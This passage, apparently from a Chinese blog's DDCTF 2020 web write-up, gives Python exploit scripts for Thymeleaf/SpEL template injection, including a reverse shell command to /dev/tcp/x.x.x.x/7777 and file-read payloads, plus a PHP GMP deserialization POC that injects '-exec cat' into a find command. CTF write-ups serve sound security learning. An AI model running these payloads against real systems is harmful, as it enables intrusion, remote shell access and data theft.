class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">    data = <span class="string">&quot;content=&quot;</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResult</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getString</span>(<span class="params">string</span>):</span><br><span class="line">    strc=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">&quot;T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getClass</span>(<span class="params">className</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;T(com.ctf.model.User).getClassLoader().loadClass(&quot;</span>+getString(className)+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.list(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(render(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.lines(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/flag_is_here&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(render(poc)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151213122.png" alt="image-20200905151213122"></p>
+<p>比赛结束后又尝试了绕过限制getShell成功</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908160754830.png" alt="image-20200908160754830"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] submit...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">    data = <span class="string">&quot;content=&quot;</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResult</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getString</span>(<span class="params">string</span>):</span><br><span class="line">    strc=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">&quot;T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getClass</span>(<span class="params">className</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;T(com.ctf.model.User).getClassLoader().loadClass(&quot;</span>+getString(className)+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResultWithParameter</span>(<span class="params">url,parameter</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url+parameter</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;[[$&#123;&quot;</span>+getClass(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)+<span class="string">&quot;.getConstructors()[1].newInstance(#request.getParameterValues(&quot;</span>+getString(<span class="string">&quot;cmd&quot;</span>)+<span class="string">&quot;)).start()&#125;]]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResultWithParameter(submit(poc),<span class="string">&quot;?cmd=/bin/bash&amp;cmd=-c&amp;cmd=echo success&gt; /tmp/leixiao&quot;</span>))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.list(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/tmp&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(submit(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.lines(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/tmp/leixiao&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(submit(poc)))</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getResultWithParameter(submit(poc),<span class="string">&quot;?cmd=/bin/bash&amp;cmd=-c&amp;cmd=&quot;</span>+urllib.parse.quote_plus(<span class="string">&quot;/bin/bash -i &gt;&amp;/dev/tcp/x.x.x.x/7777 0&gt;&amp;1&quot;</span>) )</span><br></pre></td></tr></table></figure>
+
+<p>反弹Shell后发现权限很低</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908162950387.png" alt="image-20200908162950387"></p>
+<p>就拖份源码吧</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163055003.png" alt="image-20200908163055003"></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163122104.png" alt="image-20200908163122104"></p>
+<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$kw0ng</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kw0ng = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find /HackersForever &#x27;</span> . <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="variable">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contents</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cont</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">ShowOff</span>();</span><br><span class="line"><span class="variable">$bullet</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$bullet</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$bullet</span> == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$infos</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obstacle1</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$obstacle2</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$mc</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">    <span class="variable">$mc</span>-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$bullet</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$mc</span>-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>/hint/hint.php</code>得到提示和一半flag</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905185300895.png" alt="image-20200905185300895"></p>
+<p>以关键字google到参考文章<a target="_blank" rel="noopener" href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p>
+<p>覆盖<code>$mc</code>对象的<code>flag</code>属性，命令注入，题目中的$mc在本地搭建环境打印出来后为object#4，尝试了很久很久才发现文章中的poc里的<code>s:1:&quot;1&quot;</code>要改成<code>s:1:&quot;4&quot;</code>，其中的4决定了GMP覆盖的对象是哪个object，DateInterval为php5.6-5.6.11可利用的内置类，POC如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$inner</span> = <span class="string">&#x27;s:1:&quot;4&quot;;a:3:&#123;s:5:&quot;kw0ng&quot;;R:2;s:4:&quot;flag&quot;;s:43:&quot;-exec cat /HackersForever/suffix_flag.php ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$exploit</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905230759614.png" alt="image-20200905230759614"></p>
+<p>后来看其他师傅的WP发现不用GMP，也可以直接构造POP链获取flag，参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216694">https://www.anquanke.com/post/id/216694</a></p>
+<p>（一直不知道在<code>$v</code>可控的情况下，可以传入元素为一个对象和函数名的数组，这样<code>$v()</code>就能调用这个对象的方法）</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200910220826959.png" alt="image-20200910220826959"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/08/27/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/" rel="prev" title="两则JSON CSRF实例">
+                  <i class="fa fa-angle-left"></i> 两则JSON CSRF实例
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/" rel="next" title="智能合约漏洞靶场——Ethernaut">
+                  智能合约漏洞靶场——Ethernaut <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
